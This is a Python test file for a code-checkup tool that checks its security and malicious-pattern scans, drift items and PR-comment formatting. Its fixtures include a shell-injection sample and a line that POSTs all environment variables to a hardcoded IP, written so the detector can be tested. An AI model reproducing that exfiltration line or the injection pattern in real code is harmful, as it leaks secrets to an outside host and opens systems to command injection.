#!/usr/bin/env python3
"""Tests for /checkup.

    python -m skills.checkup.test_checkup
"""

from __future__ import annotations

import json
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from skills.checkup.cli import run, format_pr_comment, PR_COMMENT_MARKER


def _ok(msg, cond, state):
    print(f"  [{'PASS' if cond else 'FAIL'}] {msg}")
    state[0 if cond else 1] += 1


def main() -> int:
    state = [0, 0]
    print("== checkup tests ==")

    with tempfile.TemporaryDirectory() as d:
        proj = Path(d)
        (proj / "app.py").write_text("def f():\n    return 1\n", encoding="utf-8")
        r = run(proj)
        _ok("returns the canonical sections",
            all(k in r for k in ("directives", "infra_tips", "duplication",
                                 "cost", "by_component", "drift", "headline",
                                 "security", "malicious")), state)
        _ok("clean project has no security findings",
            r["security"]["count"] == 0 and r["security"]["available"], state)
        _ok("clean project has a malicious-scan section, nothing suspicious",
            r["malicious"]["available"] and r["malicious"]["suspicious"] == 0, state)

        # a project with a real taint flow surfaces in security + drift + comment
        (proj / "vuln.py").write_text(
            "import os, sys\nos.system('echo ' + sys.argv[1])\n", encoding="utf-8")
        rv = run(proj)
        _ok("taint flow surfaces in checkup security",
            rv["security"]["count"] >= 1 and "CWE-78" in rv["security"]["by_cwe"], state)
        _ok("high-severity security adds a drift item",
            any("security finding" in x for x in rv["drift"]), state)
        _ok("security appears in the PR comment",
            "🛡️ Security" in format_pr_comment(rv), state)

        # exfiltration (POST env to a hardcoded IP — high-signal) → suspicious + drift
        (proj / "evil.py").write_text(
            "import os, requests\n"
            "requests.post('http://13.37.13.37/x', data=dict(os.environ))\n",
            encoding="utf-8")
        rm = run(proj)
        _ok("malicious-pattern scan flags obfuscated exec as suspicious",
            rm["malicious"]["suspicious"] >= 1, state)
        _ok("suspicious patterns add a drift item",
            any("suspicious code pattern" in x for x in rm["drift"]), state)
        _ok("malicious section appears in the PR comment",
            "🦠 Malicious-pattern scan" in format_pr_comment(rm), state)
        _ok("analysis cost is 0 LLM tokens", r["cost"]["analysis_llm_tokens"] == 0, state)
        _ok("flags missing policy as drift",
            any("policy" in x.lower() for x in r["drift"]), state)
        _ok("flags MCP-not-wired as drift",
            any("MCP" in x for x in r["drift"]), state)
        _ok("result is JSON-serialisable", isinstance(json.dumps(r), str), state)

        # after committing a policy, that particular drift item goes away
        from skills.preflight import policy
        policy.write_default(proj)
        r2 = run(proj)
        _ok("policy drift clears once committed",
            r2["policy_committed"] and not any("No .botte/policy" in x for x in r2["drift"]),
            state)

        # PR comment formatting (for the GitHub Action)
        md = format_pr_comment(r)  # r has drift (no policy / no MCP)
        _ok("PR comment carries the stable marker", PR_COMMENT_MARKER in md, state)
        _ok("PR comment shows a drift verdict when there is drift",
            "drift item" in md and "### Drift to fix" in md, state)
        _ok("PR comment lists each drift item",
            all(x in md for x in r["drift"]), state)

        md_clean = format_pr_comment({"drift": [], "headline": "All good",
                                      "loc_total": 10, "policy_committed": True,
                                      "cost": {"analysis_llm_tokens": 0,
                                               "always_on_tokens_per_session": 0}},
                                     repo="zedarvates/botte-secrete", sha="abc1234def")
        _ok("PR comment shows the no-drift verdict", "No drift" in md_clean, state)
        _ok("PR comment links the commit when repo+sha given",
            "abc1234" in md_clean and "/commit/abc1234def" in md_clean, state)

    passed, failed = state
    print(f"\nRESULT: {passed} passed, {failed} failed")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
